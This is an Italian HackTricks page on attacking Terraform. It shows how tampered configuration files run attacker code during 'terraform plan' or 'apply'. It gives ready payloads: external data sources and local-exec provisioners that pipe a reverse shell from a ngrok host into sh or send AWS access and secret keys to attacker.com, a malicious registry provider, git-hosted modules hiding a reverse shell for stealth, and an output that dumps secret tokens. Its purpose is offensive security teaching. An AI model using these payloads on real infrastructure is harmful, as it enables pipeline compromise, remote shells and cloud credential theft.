# Sicurezza di Terraform

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di github.

</details>

## Informazioni di base

[Dalla documentazione: ](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform √® uno strumento di **infrastruttura come codice** che consente di definire sia **risorse cloud che risorse locali** in file di configurazione leggibili dall'uomo che √® possibile versionare, riutilizzare e condividere. √à quindi possibile utilizzare un flusso di lavoro coerente per fornire e gestire tutta la propria infrastruttura durante il suo ciclo di vita. Terraform pu√≤ gestire componenti a basso livello come risorse di calcolo, archiviazione e rete, nonch√© componenti ad alto livello come voci DNS e funzionalit√† SaaS.

### Come funziona Terraform?

Terraform crea e gestisce risorse su piattaforme cloud e altri servizi tramite le loro interfacce di programmazione delle applicazioni (API). I provider consentono a Terraform di lavorare con praticamente qualsiasi piattaforma o servizio con un'API accessibile.

![](<../.gitbook/assets/image (33).png>)

HashiCorp e la comunit√† di Terraform hanno gi√† scritto **oltre 1700 provider** per gestire migliaia di diversi tipi di risorse e servizi, e questo numero continua a crescere. √à possibile trovare tutti i provider disponibili pubblicamente nel [Terraform Registry](https://registry.terraform.io/), tra cui Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog e molti altri.

Il flusso di lavoro di base di Terraform consiste in tre fasi:

* **Scrittura:** Si definiscono le risorse, che possono essere distribuite su pi√π provider e servizi cloud. Ad esempio, √® possibile creare una configurazione per distribuire un'applicazione su macchine virtuali in una rete Virtual Private Cloud (VPC) con gruppi di sicurezza e un bilanciamento del carico.
* **Pianificazione:** Terraform crea un piano di esecuzione che descrive l'infrastruttura che verr√† creata, aggiornata o eliminata in base all'infrastruttura esistente e alla configurazione.
* **Applicazione:** Con l'approvazione, Terraform esegue le operazioni proposte nell'ordine corretto, rispettando le dipendenze delle risorse. Ad esempio, se si aggiornano le propriet√† di una VPC e si cambia il numero di macchine virtuali in quella VPC, Terraform ricreer√† la VPC prima di ridimensionare le macchine virtuali.

![](<../.gitbook/assets/image (81).png>)

## Laboratorio di Terraform

Basta installare Terraform sul tuo computer.

Qui hai una [guida](https://learn.hashicorp.com/tutorials/terraform/install-cli) e qui hai il [modo migliore per scaricare Terraform](https://www.terraform.io/downloads).

## RCE in Terraform

Terraform **non ha una piattaforma che espone una pagina web o un servizio di rete** che possiamo enumerare, quindi, l'unico modo per compromettere Terraform √® **essere in grado di aggiungere/modificare i file di configurazione di Terraform**.

Tuttavia, Terraform √® un **componente molto sensibile** da compromettere perch√© avr√† **accesso privilegiato** a diverse posizioni per poter funzionare correttamente.

Il modo principale per un attaccante di essere in grado di compromettere il sistema in cui viene eseguito Terraform √® quello di **compromettere il repository che memorizza le configurazioni di Terraform**, perch√© a un certo punto verranno **interpretate**.

In realt√†, ci sono soluzioni l√† fuori che **eseguono automaticamente terraform plan/apply dopo la creazione di una PR**, come ad esempio **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Se sei in grado di compromettere un file di configurazione di Terraform, ci sono diversi modi in cui puoi eseguire RCE quando qualcuno esegue `terraform plan` o `terraform apply`.

### Terraform plan

Terraform plan √® il **comando pi√π utilizzato** in Terraform e gli sviluppatori/soluzioni che utilizzano Terraform lo chiamano tutto il tempo, quindi il **modo pi√π semplice per ottenere RCE** √® assicurarsi di iniettare un file di configurazione di Terraform che eseguir√† comandi arbitrari in un `terraform plan`.

#### Utilizzo di un provider esterno

Terraform offre il provider [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs) che fornisce un modo per interfacciarsi tra Terraform e programmi esterni. √à possibile utilizzare la sorgente dati `external` per eseguire codice arbitrario durante una `plan`.

Iniettare in un file di configurazione di Terraform qualcosa di simile al seguente eseguir√† una shell inversa quando si esegue `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Utilizzo di un provider personalizzato

Un attaccante potrebbe inviare un [provider personalizzato](https://learn.hashicorp.com/tutorials/terraform/provider-setup) al [Terraform Registry](https://registry.terraform.io/) e successivamente aggiungerlo al codice Terraform in un ramo di sviluppo ([esempio da qui](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Il provider viene scaricato nell'`init` e eseguir√† il codice dannoso quando viene eseguito il `plan`

Puoi trovare un esempio su [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Utilizzo di un riferimento esterno

Entrambe le opzioni menzionate sono utili ma non molto stealthy (la seconda √® pi√π stealthy ma pi√π complessa della prima). Puoi eseguire questo attacco in modo ancora pi√π stealthy, seguendo questi suggerimenti:

* Invece di aggiungere direttamente il reverse shell nel file terraform, puoi **caricare una risorsa esterna** che contiene il reverse shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Puoi trovare il codice di reverse shell su [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Nella risorsa esterna, utilizza la funzionalit√† **ref** per nascondere il **codice di reverse shell di terraform in un branch** all'interno del repository, qualcosa del genere: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply verr√† eseguito per applicare tutte le modifiche, puoi anche sfruttarlo per ottenere RCE iniettando **un file Terraform malevolo con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Assicurati solo che un payload come i seguenti finisca nel file `main.tf`.
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Segui le **suggerimenti della tecnica precedente** per eseguire questo attacco in modo **pi√π discreto utilizzando riferimenti esterni**.

## Dump delle Credenziali

Puoi ottenere il **dump delle credenziali segrete utilizzate da terraform** eseguendo `terraform apply` aggiungendo al file terraform qualcosa del genere:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Strumenti di Audit

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utilizza l'analisi statica del tuo codice terraform per individuare potenziali errori di configurazione.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan √® un analizzatore statico del codice per l'Infrastruttura come Codice.

## Riferimenti

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
